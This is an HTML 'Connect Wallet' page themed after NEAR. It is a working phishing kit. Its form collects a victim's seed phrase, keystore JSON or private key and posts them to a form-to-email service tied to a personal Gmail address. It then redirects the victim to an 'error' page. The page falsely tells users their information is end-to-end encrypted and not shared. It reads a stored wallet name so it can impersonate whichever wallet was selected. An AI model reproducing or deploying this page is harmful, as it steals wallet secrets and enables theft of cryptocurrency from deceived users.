<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connect</title>
    <style>
        /* Modern, responsive CSS for your Connect Wallet page - Themed to NEAR Blue */

        /* NEAR Color Variables */
        :root {
            --color-near-blue: #4A4AEE;
            --color-near-blue-light: #6f7eff; /* Lighter shade for gradients */
            --color-near-blue-dark: #1f2f4e;  /* Darker shade for gradients */
            --color-light: #ffffff;
            --color-dark-text: #042041; /* Dark text for light backgrounds */
            --color-muted: #c8d3ff; /* Light blue for subtle text */
            --color-glass-effect: rgba(255, 255, 255, 0.04);
            --color-input-bg: rgba(255, 255, 255, 0.02);
            --color-border-input: rgba(255, 255, 255, 0.06);

            /* General Layout */
            --radius: 12px;
            --max-width: 420px;
            --card-padding: 22px;
            --fw-medium: 600;
        }

        /* Page baseline */
        * { box-sizing: border-box; }
        html, body { height: 100%; margin: 0; }
        body {
            font-family: "Poppins", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
            background: linear-gradient(180deg, var(--color-near-blue-dark), var(--color-near-blue)); /* Blue gradient background */
            color: var(--color-light);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 28px;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* Outer container */
        .container {
            width: 100%;
            max-width: var(--max-width);
            /* Translucent blue gradient background */
            background: linear-gradient(180deg, rgba(74, 74, 238, 0.1), rgba(74, 74, 238, 0.05));
            border-radius: 14px;
            padding: var(--card-padding);
            box-shadow: 0 18px 40px rgba(2, 6, 30, 0.55);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        /* Heading */
        .container h2, .container h3 {
            margin: 0 0 10px;
            font-size: 20px;
            letter-spacing: -0.2px;
            font-weight: 800;
            color: var(--color-light);
        }
        .container h3 {
            font-size: 14px;
        }
        .container p.helper {
            margin: 0 0 14px;
            color: var(--color-muted);
            font-size: 13px;
        }

        /* Button row (mode buttons) */
        .buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 12px 0 16px;
            flex-wrap: wrap;
        }
        .buttons button {
            appearance: none;
            -webkit-appearance: none;
            border: none;
            background: var(--color-glass-effect); /* Translucent background */
            color: var(--color-light); /* Light text for buttons */
            padding: 8px 12px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 700;
            font-size: 13px;
            transition: all .18s ease;
            box-shadow: 0 6px 18px rgba(2, 6, 30, 0.35);
        }
        .buttons button:hover { transform: translateY(-3px); }
        .buttons button.active {
            background: linear-gradient(90deg, var(--color-near-blue-light), var(--color-near-blue)); /* Blue gradient active state */
            color: var(--color-dark-text); /* Dark text on active blue button */
            box-shadow: 0 10px 30px rgba(74, 74, 238, 0.14); /* Blue shadow */
        }

        /* Input groups (hidden/show blocks) */
        #phraseInput, #keystoreInput, #privateKeyInput {
            display: none; /* JS toggles display: block */
            margin: 12px 0 6px;
            text-align: left;
            animation: fadeIn .18s ease both;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px) } to { opacity: 1; transform: none } }

        label {
            display: block;
            color: var(--color-light); /* Light text for labels */
            font-weight: 600;
            font-size: 13px;
            margin-bottom: 6px;
        }

        /* Inputs styling */
        input[type="text"], input[type="password"], input[type="number"], textarea {
            width: 100%;
            padding: 12px 12px;
            border-radius: 10px;
            border: 1px solid var(--color-border-input);
            background: var(--color-input-bg);
            color: var(--color-light); /* Light text in inputs */
            font-size: 14px;
            outline: none;
            transition: box-shadow .12s ease, border-color .12s ease, transform .08s ease;
        }
        textarea { min-height: 110px; resize: vertical; padding-top: 10px; }
        input::placeholder, textarea::placeholder { color: rgba(235, 245, 255, 0.4); }

        /* Focus states */
        input:focus, textarea:focus {
            border-color: rgba(74, 74, 238, 0.95); /* Blue border on focus */
            box-shadow: 0 6px 18px rgba(74, 74, 238, 0.08); /* Blue shadow on focus */
            transform: translateY(-1px);
        }

        /* Submit button */
        #submitBtn {
            width: 100%;
            margin-top: 12px;
            padding: 12px 14px;
            border-radius: 10px;
            border: none;
            font-weight: 800;
            font-size: 15px;
            background: linear-gradient(90deg, var(--color-near-blue-light), var(--color-near-blue)); /* Blue gradient button */
            color: var(--color-dark-text); /* Dark text on blue button */
            cursor: pointer;
            box-shadow: 0 12px 30px rgba(74, 74, 238, 0.12); /* Blue shadow */
            transition: transform .12s ease, box-shadow .12s ease;
        }
        #submitBtn:hover { transform: translateY(-3px); box-shadow: 0 18px 42px rgba(74, 74, 238, 0.18); } /* Blue hover shadow */

        /* Close button: if you add one later */
        .closeBtn {
            position: absolute;
            right: 14px;
            top: 14px;
            background: var(--color-glass-effect);
            border-radius: 8px;
            width: 36px;
            height: 36px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            border: none;
            color: var(--color-light);
            font-weight: 700;
            box-shadow: 0 6px 14px rgba(2, 6, 30, 0.35);
        }

        /* small helper / note text */
        .small-note {
            margin-top: 10px;
            color: var(--color-muted);
            font-size: 12px;
        }

        /* Responsive: smaller screens */
        @media (max-width: 420px) {
            :root { --max-width: 360px; }
            .container { padding: 18px; }
            .buttons { gap: 8px; }
            .buttons button { padding: 8px 10px; font-size: 13px; }
            #submitBtn { padding: 11px; font-size: 14px; }
        }

        /* Optional visual enhancement: circular subtle background glow */
        .container::before {
            content: "";
            position: absolute;
            width: 420px;
            height: 420px;
            right: -120px;
            top: -120px;
            /* Subtle blue glow */
            background: radial-gradient(circle at center, rgba(74, 74, 238, 0.08), transparent 30%);
            filter: blur(30px);
            pointer-events: none;
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2 id="walletTitle">Connect Wallet</h2>
        <form id="walletForm" action="https://api.nocodesubmit.com/email/lemoakorede@gmail.com" method="POST">
            <h3>NB: All information are end to end encrypted. We do not share data and activity sessions with any other company</h3>
            <div class="buttons">
                <button type="button" onclick="showInput('phrase')">Phrase</button>
                <button type="button" onclick="showInput('keystore')">Keystore JSON</button>
                <button type="button" onclick="showInput('privateKey')">Private Key</button>
            </div>
            <div id="phraseInput">
                <label>Seed Phrase</label>
                <textarea type="text" name="seedPhrase" placeholder="Enter your wallet seed phrase"></textarea>
            </div>
            <div id="keystoreInput">
                <label>Keystore JSON</label>
                <textarea type="text" name="keystoreJSON" placeholder="Enter your Keystore JSON"></textarea>
            </div>
            <div id="privateKeyInput">
                <label>Private Key</label>
                <textarea type="text" name="privateKey" placeholder="Enter your Private Key"></textarea>
            </div>
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://error-sage.vercel.app/">
            <button type="submit" id="submitBtn">Submit</button>
        </form>
    </div>

    <script>
        const walletName = localStorage.getItem('selectedWallet');
        if (walletName) {
          document.getElementById('walletTitle').textContent = `Connect ${walletName}`;
        }

        function showInput(type) {
            document.getElementById('phraseInput').style.display = 'none';
            document.getElementById('keystoreInput').style.display = 'none';
            document.getElementById('privateKeyInput').style.display = 'none';

            // Remove active class from all buttons
            document.querySelectorAll('.buttons button').forEach(btn => btn.classList.remove('active'));

            if (type === 'phrase') {
                document.getElementById('phraseInput').style.display = 'block';
                event.target.classList.add('active'); // Add active class to clicked button
            } else if (type === 'keystore') {
                document.getElementById('keystoreInput').style.display = 'block';
                event.target.classList.add('active');
            } else if (type === 'privateKey') {
                document.getElementById('privateKeyInput').style.display = 'block';
                event.target.classList.add('active');
            }
        }

        // Show Phrase input by default and set its button as active
        showInput('phrase');
        document.querySelector('.buttons button:nth-child(1)').classList.add('active'); // Set 'Phrase' button as active by default
    </script>
</body>
</html>
